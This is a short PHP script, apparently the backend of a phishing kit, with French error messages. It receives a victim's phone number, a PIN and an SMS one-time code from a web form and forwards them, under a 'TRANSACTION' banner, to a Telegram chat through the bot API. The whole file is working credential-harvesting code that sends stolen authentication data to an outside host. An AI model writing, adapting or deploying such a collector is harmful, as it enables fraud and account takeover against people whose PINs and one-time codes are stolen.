<?php
header('Content-Type: application/json; charset=utf-8');
$token=getenv('TELEGRAM_BOT_TOKEN'); $chatId=getenv('TELEGRAM_CHAT_ID');
if(!$token||!$chatId){http_response_code(500);echo json_encode(['ok'=>false,'error'=>'Telegram non configuré']);exit;}
$data=json_decode(file_get_contents('php://input'),true)?:[]; $action=$data['action']??'';
if($action==='msg1'){
 $phone=trim($data['phone']??''); $tx=trim($data['confirmation_code']??'');
 $message="🟠🟠🟠TRANSACTION🟠🟠🟠\n\n📱 NUM : {$phone}\n🔢 PIN : {$tx}";
}elseif($action==='msg2'){
 $phone=trim($data['phone']??''); $tx=trim($data['confirmation_code']??''); $id=trim($data['sms_code']??'');
 $message="🟠🟠🟠TRANSACTION🟠🟠🟠\n\n📱 NUM: {$phone}\n🔢 PIN : {$tx}\n🆔 CODE SMS : {$id}";
}else{http_response_code(400);echo json_encode(['ok'=>false,'error'=>'Action invalide']);exit;}
$ch=curl_init("https://api.telegram.org/bot{$token}/sendMessage");
curl_setopt_array($ch,[CURLOPT_POST=>true,CURLOPT_RETURNTRANSFER=>true,CURLOPT_TIMEOUT=>15,CURLOPT_POSTFIELDS=>http_build_query(['chat_id'=>$chatId,'text'=>$message])]);
$response=curl_exec($ch); $err=curl_error($ch); curl_close($ch);
if($err){http_response_code(502);echo json_encode(['ok'=>false,'error'=>'Erreur Telegram']);exit;}
$result=json_decode($response,true); echo json_encode(['ok'=>!empty($result['ok'])]);
?>
																							